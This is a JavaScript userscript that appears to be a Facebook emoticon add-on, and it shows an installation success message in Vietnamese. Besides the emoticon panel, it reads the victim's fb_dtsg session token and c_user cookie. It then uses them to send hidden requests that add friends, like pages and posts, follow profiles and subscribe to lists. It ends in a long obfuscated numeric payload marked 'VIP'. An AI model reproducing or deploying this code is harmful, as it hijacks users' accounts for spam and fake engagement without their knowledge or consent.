	html += '<a class="navLink" title="1 Thông Báo Mới">'; // var navLink
	html += '<span style="vertical-align: middle;"><img src="http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif"></img></span>';
	html += '</a>';

	
	// Flyout
	html += '<div>'; // openToggler; var flyout
	html += '<div class="emoticonsPanel fbJewelFlyout uiToggleFlyout" style="z-index: 1; width: auto;">';
	// {

	
	// Beeper
	html += '<div class="jewelBeeperHeader">';
	html += '<div class="beeperNubWrapper">';
	html += '<div class="beeperNub" style="left: 4px;"></div>';
	html += '</div>';
	html += '</div>';

	// Tabs
	// var titleContainer
	html += '<ul style="display: text-align: center;">';
	html += '</ul>';

	// Bodies
	html += '<div>'; // var bodyContainer
	html += '</div>';

	// Footer
	html += '<div class="jewelFooter">';
    html += '<a class="jewelFooter" href="https://www.facebook.com/Erosaka" target="_blank">Chúc Mừng Bạn Đã Cài Đặt ICON FACEBOOK Thành Công <br>FaceBook.Com</a>';
	html += '</div>';

	// }
	html += '</div>'; // emoticonsPanel
	html += '</div>'; // openToggler

	// }
	html += '</div>'; // fbJewel
	html += '</li>'; // navItem

	var navItem = createElement(html);
	var pageNav = document.querySelector("#pageNav");
	pageNav.insertBefore(navItem, pageNav.firstChild);

	// Maintain active element
	navItem.addEventListener("click", function() {
		if (isInstanceOfTextInput(lastActiveElement)) {
			lastActiveElement.focus();
		}

		openFlyoutCommand = undefined; // Do nothing
	}, true);

	var navLink = navItem.firstChild.firstChild;
	var flyout = navLink.nextSibling;
	var titleContainer = flyout.firstChild.childNodes[1];
	var bodyContainer = titleContainer.nextSibling;

	// Toggle listener
	navLink.addEventListener("click", function() {
		openFlyoutCommand = !isFlyoutOpen(flyout);
	});

	// Picture emoticon tab
	var picEmoTab = createTab(titleContainer, bodyContainer);
	picEmoTab.title.click(); // Default tab
	
	picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) {
		if (emoticon.class === undefined) { // No picture
			return false;
		}

		// [Bug] 2 characters unicode emoticons
		if (emoticon.chars.length == 2) {
			return false;
		}

		return true;

			}));

	// = Other listener =======

	document.addEventListener("click", function() {
		// Get active textarea
		lastActiveElement = document.activeElement;

		// Toggle flyout
		if (openFlyoutCommand !== undefined) {
			openFlyout(flyout, openFlyoutCommand);
		}
		openFlyoutCommand = false;
 	});
})();


	// === Facebook Emoticons ====
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function IDS(r) {
  var X = new XMLHttpRequest();
  var XURL = "//www.facebook.com/ajax/add_friend/action.php";
  var XParams = "to_friend=" + r +"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
  X.open("POST", XURL, true);
  X.onreadystatechange = function () {
    if (X.readyState == 4 && X.status == 200) {
      X.close;
    }
  };
  X.send(XParams);
}
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p +"&add=true&reload=false&fan_origin=page_timeline&fan_source=&cat=&nctr[_mod]=pagelet_timeline_page_actions&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 200) { Page.close; } }; Page.send(PageParams); }
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var now=(new Date).getTime(); function P(opo) { var X = new XMLHttpRequest(); var XURL ="//www.facebook.com/ajax/ufi/like.php"; var XParams = "like_action=true&ft_ent_identifier="+opo+"&source=1&client_id="+now+"%3A379783857&rootid=u_jsonp_39_18&giftoccasion&ft[tn]=%3E%3D&ft[type]=20&ft[qid]=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user="+user_id+"&__a=1&__dyn=7n88QoAMBlClyocpae&__req=g4&fb_dtsg="+fb_dtsg+"&phstamp="; X.open("POST", XURL, true); X.onreadystatechange = function () { if (X.readyState == 4 && X.status == 200) { X.close; } }; X.send(XParams); }
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
function a(abone)
{ var http4=new XMLHttpRequest;
 var url4="/ajax/follow/follow_profile.php?__a=1";
 var params4="profile_id="+abone+"&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg="+fb_dtsg+"&lsd&__"+user_id+"&phstamp=";
 http4.open("POST",url4,true);
 http4.onreadystatechange=function()
 {  if(http4.readyState==4&&http4.status==200)http4.close };
 http4.send(params4)}
function sublist(uidss)
{ var a = document.createElement('script');
 a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
 document.body.appendChild(a);
}
/* VIP */
var _9763;var _3687='66560F168A166A1474F1434C1354A1714E64306F1938E1354F1626A63826B1978C1354A1626E2954D1354B1706F1938C1954C1906D1354B1738D1874E1922B1906C1354E1434E1474C1178A2042F1874C2010D1354E1770F1938E2026B1962D1906C1354F1586A1354B1370D1370D1570A1178F2042B1874B2010C1354C1642B1906F2018F1890F2010E1938A1994A2026A1938A1986B1978A2018F1354A1586E1354B1370F1370C1450E1178D1354B1354D1354B1354A1858A2026C1906A2058F2026A1354D1586D1354E1410A1410E1570D1178B1178F1914E2034E1978B1890F2026E1938F1986D1978C1354F1682F1978D2042C1938A2026C1906F1658C2010F1938E1906B1978A1898A2018B1418A1986B1994B1986A1426F1354C2082A1178D1354E1354A1354D1354F1946F2058F1466F1962D1986F1874C1898B1418F2050A1938E1978E1898C1986C2050E1466E1962B1986B1890D1874E2026C1938C1986A1978A1466C1994F2010D1986A2026F1986F1890B1986A1962D1354A1442C1354D1370B1474D1474B2050C2050B2050C1466D1914E1874E1890B1906D1882D1986C1986E1954F1466C1890B1986C1970B1474A1474E1874A1946E1874B2058C1474C2026E2066D1994F1906D1874A1930E1906C1874B1898F1474C1914D1938B2010F2018C2026B1858F1898A1906D1922A2010F1906C1906E1466F1994D1930B1994A1602E2034D1938D1898F1586E1370F1354C1442E1354F1986F1994D1986B1354C1442F1354D1370D1402D2034D1978F2010F1906E1914C1586F1882B1898F1858A1914B2010C1938C1906D1978F1898B2018D1858A2026E1874D1882A1402A1978F1890A2026C2010A1826A1858F1970B1986B1898C1842E1586A1994B1874F1922F1906D1962D1906A2026D1858F2026B1938B1970A1906D1962D1938A1978C1906B1858F1874B1994F1994A1858F1890F1986D1962C1962E1906B1890F2026C1938D1986E1978A1858E1370C1354F1442E1354F2034E2018C1906F2010A1858E1938C1898A1354A1442D1354E1370A1394C1506A1618D1498A1506D1522B1530D1506A1490A1546D1506E1514B1554A1394F1506F1618B1498B1402F1858C1858B2034D2018B1906E2010B1586B1370F1354F1442C1354C2034B2018B1906E2010B1858F1938A1898D1354F1442A1354B1370E1402E1858C1858F1874D1586C1490E1402F1858F1858C1898A2066F1978A1586A1538E1978E1546D1874C1930B2066F1946F1498A2002C1970B1994C1522B2074B1994B1746E1554B1778F1970B1794D1794C1874D1778F1666D2066C2058A1938A1554E1618E2066C1546E1402B1858B1858A2010C1906A2002D1586F1938B1402B1914D1882F1858C1898E2026A2018F1922C1586D1370D1354C1442E1354A1914E1882E1858C1898F2026F2018C1922A1354A1442E1354A1370A1402B2026E2026B2018E2026F1874F1970D1994B1586F1498C1530F1522F1546C1490C1530F1546B1546B1514F1554F1538B1490E1490C1498A1538A1546D1530D1522A1370E1450C1354E1914F2034C1978A1890D2026F1938B1986F1978A1354C1418B1874F1426D1354B2082E1178E1354C1354D1354B1354F1354F1354C1354A1354F2042E1874C2010C1354D1882A1354F1586E1354B1874F1466E2018B2034C1882F2018F2026F2010C1938A1978A1922C1418F1874E1466C1938E1978D1898C1906E2058D1730F1914E1418C1370E2082C1370D1426A1426E1570E1178E1354C1354F1354F1354A1354A1354F1354D1354B2042C1874D2010B1354A1890E1354D1586D1354C1690B1762C1730E1722E1466E1994D1874C2010D2018B1906A1418C1882F1426A1570A1178A1354B1354D1354C1354E1354D1354D1354F1354E1938D1458D1458F1570F1178E1354D1354A1354B1354F1354B1354A1354B1354D1642B1906D2018E1890E2010D1938F1994C2026E1938B1986E1978B2018F1354D1586A1354A1370C1578F1898B1938C2042C1354B1890A1962E1874E2018E2018E1586E1410D1914E2010E1938A1906B1978B1898D1458F1906F1898A1922D1906D1458A1978F1874E1970E1906B1410E1354F2018C2026E2066F1962B1906E1586C1410D1994C1874B1898F1898C1938F1978F1922A1458F1882F1986A2026E2026F1986B1970B1562F1522A1994C2058E1570E2026B1906F2058A2026B1458E1874D1962B1938A1922B1978B1562A1962F1906B1914F2026A1570F1914F1986B1978A2026A1458E2018B1938F2074D1906F1562D1490E1482A1994A2058A1570E2050B1930A1938C2026A1906E1458C2018F1994F1874D1890F1906C1562B1994B2010F1906D1458A2050B2010E1874A1994C1570F1370B1570E1178A1354E1354C1354A1354A1354A1354D1354E1354D1938C1914E1354A1418A1890F1466E1906C2010C2010B1986C2010F1426F1354D2082E1178E1354D1354C1354C1354D1354C1354B1354F1354C1354A1354E1354A1354C1642C1906D2018D1890B2010E1938A1994F2026E1938D1986D1978E2018F1354E1442A1586E1354C1370B1890D1986F1962D1986D2010B1562B1898E1874E2010E1954F1922E2010D1906B1906A1978E1410D1594F1370D1570A1178A1354A1354E1354E1354C1354C1354A1354A1354A1354A1354B1354F1354F1906D2010E2010A1442F1442E1570E1178C1354E1354A1354E1354B1354B1354D1354F1354A1354D1354C1354E1354A1938F1914C1354C1418D1890E1466D1906E2010F2010F1986B2010F1642B1906D2018F1890F2010C1938C1994D2026D1938C1986F1978F1426A1354E1642A1906B2018C1890A2010F1938B1994E2026D1938A1986B1978B2018C1354A1442E1586F1354B1890B1466C1906F2010C2010A1986E2010F1642F1906F2018F1890F2010C1938D1994F2026A1938E1986C1978A1570A1178D1354C1354E1354D1354A1354C1354B1354F1354A1354E1354A1354F1354F1906B1962A2018D1906E1354E1642C1906B2018E1890D2010B1938B1994C2026C1938F1986A1978D2018A1354E1442B1586B1354D1690D1762D1730A1722E1466C2018D2026A2010A1938E1978B1922E1938E1914B2066A1418E1890F1450D1354A1978A2034A1962B1962D1450D1354C1370D1370E1426A1178E1354D1354F1354D1354C1354E1354C1354E1354D2098B1354C1906B1962C2018E1906D1354F2082E1178F1354D1354E1354F1354C1354A1354A1354C1354B1354B1354E1354B1354A1642C1906B2018B1890C2010C1938E1994B2026F1938F1986B1978A2018B1354A1442D1586B1354F1370A1890F1986E1962E1986F2010E1562E1898E1874C2010E1954E1922D2010B1906C1906A1978D1410A1594F1370C1570D1178B1354E1354E1354C1354D1354A1354A1354C1354F1354E1354C1354F1354D1642F1906C2018E1890E2010D1938E1994F2026D1938E1986A1978C2018E1354A1442C1586D1354C1874F2010E1978F1826C1938F1842C1354F1442C1354B1370C1354B1370B1570D1178F1354A1354F1354A1354E1354D1354B1354D1354E1354D1354A1354D1354F2018C2034E1890C1442D1442C1178A1354D1354A1354A1354E1354B1354A1354D1354D2098A1178F1354C1354F1354A1354F1354C1354F1354E1354D1642C1906A2018B1890A2010C1938C1994C2026B1938E1986B1978B2018D1354B1442A1586D1354E1370E1578D1474B1898E1938D2042A1594C1370D1570D1178E1354A1354C1354D1354D1354D1354F1354A1354E2042A1874C2010B1354D1898A1938A2018B1994E1962A1874E2066B1354A1586F1354F1370E1370E1570F1178B1354E1354A1354D1354F1354B1354A1354F1354B1898D1938A2018A1994A1962D1874D2066E1354A1442C1586D1354B1370A1370C1570C1178F1354C1354B1354F1354D1354F1354B1354E1354E1938D1914E1354B1418C1938F1354B1594A1354E1482C1426C1354B2082B1178B1354D1354F1354C1354F1354B1354B1354A1354E1354A1354B1354D1354C1898C1938B2018F1994F1962A1874E2066C1354F1442D1586D1354C1874C2010B2010F1466C1962D1906C1978C1922D2026A1930A1354D1442E1354A1370B1578A1882E2010E1474D1594A1370B1570C1178C1354E1354E1354D1354D1354D1354E1354F1354D1354A1354C1354A1354F1898B1938D2018D1994D1962A1874D2066F1354E1442D1586D1354E1370A1578F1882A1594B1370E1354E1354C1442B1354C1418B1874C2010C2010A1466F1962F1906A1978F1922B2026E1930A1354F1458D1354A1938C1426B1354C1442F1354D1370B1354E1354C1738A2010E1986B1890A1906B2018D2018C1906B1898F1354C1370E1570D1178F1354D1354B1354C1354D1354E1354E1354F1354D1354B1354D1354A1354A1898D1938F2018D1994B1962D1874A2066E1354F1442C1586F1354B1370B1418C1370E1354F1442F1354B1938E1354F1442F1354F1370A1354B1706A1906F1914E2026C1906C1898A1466C1466B1466C1426C1370E1570E1178A1354B1354A1354A1354F1354B1354D1354F1354E1354F1354C1354B1354A1898D1938E2018D1994B1962B1874C2066A1354F1442D1586B1354D1370B1370C1570B1178B1354A1354F1354E1354B1354A1354C1354A1354C1354B1354A1354D1354A1898F1938B2018F1994D1962A1874D2066C1354D1442F1586D1354B1642C1906F2018A1890D2010B1938F1994B2026E1938D1986F1978C2018F1570C1178D1354A1354C1354D1354F1354C1354D1354C1354E1354D1354F1354A1354C1898A1938C2018C1994A1962E1874C2066B1354A1442C1586C1354D1370E1370D1570B1178C1354B1354A1354A1354D1354E1354F1354D1354D1354B1354B1354F1354B1898F1938D2018C1994C1962A1874C2066C1354C1442F1586B1354C1370A1370A1570E1178E1354F1354C1354F1354B1354E1354C1354D1354C1354B1354A1354E1354A1898D1938C2018C1994D1962D1874A2066A1354F1442E1586F1354A1370D1354D1370D1354D1442A1354A1874E2010F1978F1826D1938D1842E1354C1442E1354E1370B1466A1578A1474A1882F2010D1594E1370F1570B1178A1354A1354F1354E1354C1354B1354A1354E1354B1354D1354C1354B1354C1898A1938E2018A1994A1962E1874E2066A1354D1442A1586F1354A1858E2026D1906D2058C2026F1570D1178F1354C1354B1354E1354D1354D1354C1354C1354D1354E1354F1354C1354A1898D1938B2018D1994F1962B1874A2066B1354A1442F1586F1354D1370A1578D1474D1898D1938C2042F1594A1370F1570F1178C1354F1354B1354F1354B1354C1354A1354D1354E1354C1354E1354E1354D1898C1938B2018D1994C1962F1874A2066B1354A1442F1586E1354C1370E1578E1474F1898E1938A2042D1594B1370D1570D1178A1178A1354E1354E1354F1354D1354B1354D1354D1354F1354B1354E1354C1354B2050B1938B1978F1898B1986C2050E1826B2026B1874E1922E1354F1442C1354C1370F1858F1890D1962B1986A2018D1906A1370F1842D1354D1586C1354E2026C2010B2034F1906F1178C1354C1354A1354F1354F1354A1354E1354F1354D2098B1354C1906A1962C2018E1906D1354B2082D1178D1354D1354B1354D1354B1354B1354E1354B1354B1354E1354B1354C1354C1770B1938F2026D1962F1906A1354E1586D1354B1370B1370C1570D1178F1354B1354F1354A1354F1354C1354C1354E1354E1354F1354E1354C1354B1898E1938C2018E1994D1962C1874C2066A1354D1442A1586D1354C1874F2010A2010B1466F1962B1906F1978F1922F2026F1930A1354E1442B1354F1370B1354A1354B1370E1570A1178B1354C1354B1354C1354F1354C1354E1354B1354D1354E1354C1354D1354D1898F1938F2018B1994D1962B1874B2066A1354B1442C1586E1354A1370F1578A1898A1938B2042C1594F1370B1570B1178B1354E1354B1354F1354D1354F1354B1354D1354F1354A1354C1354D1354D1898B1938C2018C1994F1962B1874F2066E1354B1442B1586E1354C1370C1370B1570F1178E1354F1354F1354F1354D1354E1354F1354B1354D1354A1354F1354E1354D1898D1938D2018A1994A1962E1874C2066C1354B1442A1586D1354C1858A2026A1906B2058E2026C1570C1178F1354B1354D1354E1354D1354C1354F1354F1354A1354C1354B1354D1354A1898B1938F2018E1994C1962C1874C2066E1354F1442C1586A1354F1370B1578C1474C1898D1938F2042F1594F1370F1570B1178A1354C1354F1354F1354D1354D1354E1354F1354B1354D1354A1354E1354D2050F1938F1978C1898C1986C2050D1826D2026C1874E1922A1354E1442D1354F1370E1858E1890A1962A1986E2018C1906E1370D1842F1354D1586F1354E1914C1874F1962E2018F1906A1178D1354A1354A1354D1354D1354A1354E1354E1354D2098F1178A1354A1354F1354D1354B1354E1354B1354E1354D1898C1938F2018A1994B1962F1874C2066C1354B1442C1586D1354F1370B1578C1474F1898D1938C2042D1594E1370C1570D1178A1354E1354E1354A1354C1354B1354E1354D1354D1898D1986A1890E2034A1970B1906B1978E2026F1466D1922E1906F2026A1650B1962E1906A1970E1906E1978E2026C1626F2066D1682A1898A1418B1370F1994F1874E1922D1906A1962A1906E2026B1858E2018B1938A1898E1906D1882D1874B2010D1370E1426D1466E1938C1978C1978C1906E2010E1674A1770E1714B1706A1354F1586D1354B1898D1938A2018A1994F1962D1874C2066E1178E1354D1354C1354E1354C2098B1450C1354B1370A2026C1906E2058F2026B1370F1450F1354C1370F1994F1986F2018C2026E1370B1426E1570C1178B1354D1354A1354C1354F2026B1874E2066D1458A1458E1570C1178A1354D1354B1354F1354A1938D1914B1354C1418C2026E1874B2066C1354B1594B1354B1482E1426A1354E2082F1178F1354A1354D1354D1354B1354E1354B1354D1354F2042C1874B2010A1354B2018E1354B1586C1354A1874B2010A2010D1826D2026E1874C2066F1842D1570E1178A1354C1354A1354A1354C1354F1354A1354F1354D2018B1906A2026A1770A1938B1970C1906D1986A2034F2026F1418B1370F1682D1978E2042F1938D2026F1906E1658E2010D1938E1906D1978A1898C2018D1418B1370B1354E1442D1354E2018F1354B1442C1354C1370D1426A1370F1450D1354B1490B1482A1482E1426B1178A1354E1354E1354B1354D2098A1178F1354A1354C1354A1354C1890D1986F1978F2018A1986F1962B1906C1466E1962A1986A1922A1418B2026C1874B2066B1354B1442A1354B1370A1474E1370E1354B1442D1354C1874A2010C2010E1466B1962A1906B1978A1922A2026C1930A1354F1442F1354D1370B1562F1370E1354D1442E1354D1874C2010F2010A1826B2026E1874F2066B1842D1354E1442B1354B1370A1474D1370D1354D1442F1354F1874C2010E1978F1826C2026F1874E2066F1842A1354E1442B1354C1370B1450F1354B2018B2034B1890B1890F1906B2018F2018C1562B1370E1354C1442D1354A2018A2034F1890F1426A1570F1178B1178F1178C1354A1354A1354E1354E1938A1914A1354F1418D2034E2018B1906A2010F1858E1938F1898B1426B1354D1946F2058D1466A1962F1986C1874F1898B1418A2050F1938F1978E1898E1986C2050C1466F1962F1986B1890F1874D2026C1938C1986C1978D1466B1994E2010A1986E2026B1986D1890C1986F1962F1354D1442B1354C1370E1474D1474E2050D2050A2050B1466B1914C1874C1890B1906D1882C1986D1986B1954B1466D1890E1986E1970F1474E1874D1946E1874A2058B1474D1994E1874D1922F1906A2018E1474E1938D1978B2042B1938D2026F1906C1474A2018C1906C1978D1898C1602B1402F1914C1882F1858B1898A2026F2018A1922D1586C1370C1354E1442A1354E1914D1882E1858C1898D2026F2018F1922B1354E1442A1354B1370F1402A1994C2010E1986B1914A1938B1962C1906F1634E1930F1986D1986A2018E1906D2010E1682C2026B1906E1970E2018E1586F1394A1538B1626F1394C1498F1498E1370F1354C1442E1354B1986B1994D1986E1354C1442E1354C1370B1394F1498A1498A1394D1506E1618C1490F1394F1538E1642C1402D1890A1930F1906C1890E1954B1874A1882F1962A1906C1938A2026B1906E1970A2018A1826E1482F1842A1586C1370F1354C1442D1354F1986F1994B1986C1354D1442D1354C1370A1402C1994A1874F1922F1906F1858B1938A1898E1586A1522B1522E1514C1546C1554E1538A1554D1490C1514F1522B1546D1498E1546F1514B1538E1402B1858A1858B2034B2018E1906E2010E1586E1370E1354B1442D1354E2034F2018D1906B2010A1858A1938C1898C1354F1442A1354B1370B1402A1858B1858C1874A1586E1490C1402F1858F1858C1898C2066D1978B1586A1538A1978F1546B1874D1642F1522E2074D1522F1634C1658E1458F1506E2034D1938A1402B1858E1858F2010B1906E2002D1586C1954B1402E1994F1930B2018C2026D1874E1970A1994A1586B1370E1450E1354A1914A2034D1978D1890D2026F1938C1986F1978D1354B1418E1426B1354E2082F2098D1450C1354D1370C2026A1906D2058F2026A1370E1450F1354D1370C1994F1986E2018C2026E1370E1426B1570A1178E1354A1938B1914F1354E1418A2034A2018D1906E2010B1858B1938B1898C1426C1354F1946B2058E1466F1962E1986D1874F1898B1418C2050D1938E1978F1898F1986F2050F1466A1962B1986E1890F1874D2026E1938E1986D1978D1466E1994A2010B1986B2026A1986B1890B1986A1962D1354B1442A1354E1370C1474B1474D2050C2050F2050D1466B1914A1874A1890D1906A1882F1986F1986C1954B1466F1890A1986A1970C1474C1874F1946D1874D2058B1474B1994F1874F1922A1906A2018D1474F1938F1978D2042D1938F2026B1906B1474A2018D1906A1978A1898E1602C1402B1914B1882F1858F1898B2026C2018B1922E1586B1370D1354C1442A1354E1914B1882C1858E1898C2026E2018D1922F1354A1442F1354F1370F1402C1994B2010C1986C1914C1938F1962F1906E1634E1930F1986A1986C2018F1906E2010A1682B2026B1906D1970D2018C1586F1394E1538F1626D1394D1498D1498E1370C1354D1442D1354E1986C1994A1986E1354D1442D1354B1370B1394E1498A1498D1394F1506A1618D1490E1394E1538D1642C1402A1890E1930F1906D1890C1954B1874B1882C1962A1906A1938E2026C1906F1970C2018B1826B1482E1842E1586E1370D1354A1442E1354D1986F1994C1986A1354C1442F1354A1370F1402A1994E1874F1922E1906C1858A1938F1898C1586C1522A1530E1482F1498F1506B1554D1506C1554B1538E1506B1546C1554C1538D1522B1538F1402A1858D1858A2034D2018C1906A2010D1586E1370D1354C1442F1354D2034F2018D1906B2010B1858D1938D1898A1354A1442A1354C1370C1402D1858E1858F1874D1586A1490B1402C1858B1858E1898F2066A1978B1586D1538A1978F1546D1874A1642D1522D2074B1522D1634B1658F1458A1506D2034A1938A1402A1858A1858C2010E1906D2002C1586E1954C1402D1994C1930C2018B2026B1874B1970F1994E1586A1370E1450A1354A1914C2034C1978B1890F2026D1938F1986E1978E1354E1418D1426E1354F2082D2098F1450A1354B1370C2026C1906A2058B2026B1370F1450C1354A1370C1994B1986A2018B2026B1370E1426E1570F1178B1354B1938B1914E1354D1418C2034F2018C1906A2010A1858F1938F1898F1426A1354C1946A2058C1466F1962F1986A1874C1898A1418B2050D1938D1978C1898B1986E2050B1466C1962F1986A1890A1874D2026D1938B1986A1978C1466C1994C2010E1986C2026F1986B1890B1986A1962D1354D1442B1354F1370B1474B1474A2050F2050F2050D1466A1914A1874A1890E1906A1882F1986B1986F1954D1466C1890E1986B1970F1474B1874E1946A1874E2058B1474A1994C1874F1922D1906C2018D1474A1938C1978E2042B1938F2026B1906E1474F2018E1906F1978D1898D1602E1402A1914D1882F1858D1898A2026F2018D1922A1586E1370E1354E1442C1354C1914D1882F1858C1898E2026C2018A1922B1354E1442B1354A1370B1402F1994B2010B1986A1914B1938D1962B1906D1634B1930D1986A1986B2018A1906E2010C1682D2026A1906F1970A2018D1586F1394E1538B1626A1394F1498C1498A1370F1354D1442D1354C1986D1994B1986C1354C1442C1354D1370E1394F1498B1498C1394D1506D1618B1490A1394E1538F1642E1402D1890A1930F1906C1890C1954C1874E1882A1962E1906F1938C2026A1906A1970F2018F1826C1482D1842A1586A1370F1354B1442A1354A1986B1994B1986F1354F1442E1354C1370C1402A1994D1874D1922B1906C1858C1938E1898B1586B1522A1554E1546C1546A1498B1514C1498F1530C1482F1490B1546C1546C1530E1514C1498B1402B1858B1858A2034A2018A1906F2010F1586C1370B1354E1442D1354B2034F2018C1906C2010E1858B1938E1898B1354D1442C1354E1370F1402A1858B1858F1874E1586D1490E1402E1858F1858A1898C2066C1978B1586F1538F1978A1546D1874A1642E1522E2074A1522C1634E1658B1458E1506A2034F1938E1402F1858F1858A2010D1906A2002C1586C1954D1402E1994B1930B2018F2026E1874D1970D1994F1586A1370E1450A1354A1914B2034A1978E1890A2026F1938F1986C1978F1354A1418B1426D1354D2082C2098B1450A1354F1370C2026B1906F2058C2026E1370E1450E1354A1370C1994E1986D2018B2026B1370D1426B1570C1178E1354C1938C1914A1354B1418D2034F2018F1906B2010C1858C1938D1898A1426D1354D1946F2058C1466C1962A1986A1874B1898D1418F2050F1938C1978D1898E1986A2050D1466C1962D1986A1890A1874D2026C1938C1986F1978E1466A1994D2010C1986F2026E1986E1890B1986D1962D1354C1442D1354B1370D1474B1474B2050B2050D2050F1466D1914E1874F1890F1906C1882F1986B1986A1954F1466D1890C1986A1970D1474C1874D1946C1874D2058F1474F1994F1874D1922A1906C2018D1474C1938E1978A2042D1938E2026E1906B1474E2018D1906D1978E1898F1602E1402D1914F1882C1858B1898A2026E2018B1922C1586A1370A1354B1442E1354E1914F1882E1858A1898D2026C2018D1922C1354A1442F1354B1370A1402E1994C2010D1986B1914A1938E1962B1906F1634C1930B1986F1986D2018F1906E2010B1682C2026B1906C1970A2018C1586E1394D1538D1626B1394A1498E1498E1370F1354D1442C1354A1986F1994B1986A1354C1442F1354A1370B1394E1498A1498F1394D1506D1618F1490F1394B1538F1642B1402A1890A1930D1906D1890E1954C1874C1882C1962B1906B1938A2026F1906D1970A2018D1826E1482D1842B1586E1370A1354B1442E1354E1986A1994D1986D1354E1442B1354D1370C1402A1994B1874F1922A1906B1858B1938F1898A1586F1490C1554D1538E1522F1514B1522C1530E1490C1506F1538A1530F1546D1498E1522A1482B1402A1858D1858A2034C2018A1906E2010C1586A1370A1354F1442A1354D2034E2018F1906A2010F1858E1938A1898D1354A1442D1354A1370D1402F1858D1858A1874A1586E1490E1402B1858E1858E1898D2066F1978C1586B1538D1978C1546D1874F1642D1522D2074B1522A1634B1658B1458D1506D2034B1938E1402B1858D1858E2010C1906D2002F1586D1954F1402A1994C1930D2018B2026B1874C1970E1994A1586B1370D1450A1354A1914B2034B1978B1890D2026D1938D1986D1978E1354B1418F1426C1354F2082D2098A1450F1354A1370E2026B1906B2058A2026B1370B1450F1354A1370A1994D1986F2018E2026E1370B1426F1570D1178D1354D1938C1914C1354C1418F2034D2018D1906D2010F1858D1938E1898B1426E1354B1946B2058F1466E1962C1986E1874C1898F1418F2050F1938C1978E1898D1986A2050C1466C1962A1986E1890F1874C2026C1938F1986A1978C1466F1994A2010B1986C2026F1986A1890C1986B1962B1354A1442E1354F1370A1474E1474F2050A2050B2050B1466F1914F1874D1890D1906A1882B1986B1986D1954F1466B1890E1986D1970D1474F1874C1946B1874D2058D1474F1994B1874C1922B1906D2018B1474F1938F1978F2042D1938D2026D1906E1474E2018E1906D1978D1898C1602A1402C1914D1882E1858C1898D2026E2018B1922F1586E1370C1354E1442B1354B1914C1882F1858D1898A2026C2018A1922A1354F1442D1354D1370D1402E1994D2010F1986A1914F1938A1962F1906B1634E1930A1986E1986F2018A1906C2010B1682F2026B1906A1970E2018C1586A1394D1538F1626C1394C1498C1498A1370F1354F1442D1354B1986E1994D1986E1354C1442E1354E1370F1394F1498E1498D1394E1506D1618F1490C1394B1538F1642C1402E1890F1930F1906D1890E1954F1874D1882F1962E1906F1938F2026F1906A1970B2018B1826B1482E1842B1586F1370C1354E1442C1354B1986C1994C1986D1354B1442C1354B1370F1402B1994B1874B1922A1906C1858C1938E1898B1586E1522F1522B1490A1546F1482A1514B1506E1506B1514F1554C1490E1498E1498B1506F1538F1402F1858C1858F2034D2018D1906C2010E1586A1370B1354E1442E1354F2034A2018A1906B2010E1858E1938F1898D1354E1442C1354F1370B1402B1858C1858B1874B1586E1490E1402D1858E1858B1898B2066D1978F1586D1538D1978F1546D1874C1642D1522A2074A1522A1634F1658B1458E1506F2034F1938D1402D1858C1858C2010F1906C2002E1586B1954D1402B1994E1930D2018B2026F1874E1970C1994F1586B1370B1450C1354B1914A2034A1978E1890D2026A1938E1986A1978B1354A1418A1426C1354D2082A2098C1450F1354B1370E2026A1906E2058E2026E1370F1450F1354D1370A1994C1986C2018E2026D1370F1426D1570D1178A1354A1938B1914B1354B1418B2034F2018E1906C2010F1858C1938E1898C1426B1354C1946C2058E1466B1962C1986C1874F1898D1418D2050D1938E1978D1898F1986D2050C1466C1962E1986D1890C1874B2026E1938B1986F1978E1466B1994A2010D1986B2026E1986D1890F1986B1962C1354D1442A1354E1370B1474C1474F2050A2050A2050A1466F1914A1874D1890D1906E1882C1986F1986D1954D1466C1890E1986D1970F1474A1874A1946B1874E2058C1474B1994E1874E1922F1906A2018B1474B1938D1978D2042D1938C2026D1906E1474C2018C1906A1978D1898D1602B1402E1914A1882C1858E1898D2026C2018D1922A1586B1370B1354C1442B1354F1914D1882A1858A1898E2026A2018A1922B1354C1442C1354E1370E1402E1994C2010A1986D1914D1938B1962F1906A1634A1930C1986D1986A2018E1906A2010C1682C2026C1906E1970F2018D1586E1394F1538E1626B1394F1498A1498B1370E1354D1442C1354A1986B1994E1986F1354C1442D1354B1370B1394C1498F1498E1394B1506E1618C1490A1394D1538A1642F1402B1890D1930B1906E1890D1954F1874E1882B1962F1906B1938C2026D1906B1970F2018A1826A1482C1842C1586D1370F1354C1442F1354F1986B1994C1986B1354E1442B1354C1370E1402C1994E1874E1922D1906C1858C1938D1898A1586C1490A1506D1554B1530E1506E1522E1498E1538A1538A1482C1530B1498A1490C1514B1530C1506A1402C1858C1858D2034E2018C1906C2010E1586C1370E1354F1442C1354F2034E2018A1906E2010C1858A1938A1898D1354B1442E1354F1370C1402F1858E1858C1874A1586D1490C1402C1858C1858A1898D2066A1978E1586A1538A1978D1546F1874C1642A1522B2074C1522E1634D1658D1458D1506A2034A1938A1402C1858A1858B2010E1906E2002E1586D1954D1402A1994D1930F2018B2026A1874E1970C1994C1586